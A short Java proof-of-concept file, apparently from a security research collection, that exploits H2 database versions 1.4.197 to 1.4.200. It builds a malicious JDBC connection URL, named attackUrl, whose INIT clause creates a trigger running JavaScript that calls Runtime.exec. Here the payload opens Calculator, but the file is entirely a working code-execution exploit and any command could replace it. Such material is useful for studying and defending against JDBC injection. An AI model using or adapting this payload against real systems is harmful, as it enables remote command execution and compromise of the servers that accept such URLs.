package h2database;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * Trigger 编译执行 Javascript
 *
 * version
 * com.h2database:h2
 * [1.4.197, 1.4.200]
 *
 * @author Whoopsunix
 */
public class TriggerJS {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String attackUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")'";
        Connection connection = DriverManager.getConnection(attackUrl);
    }
}
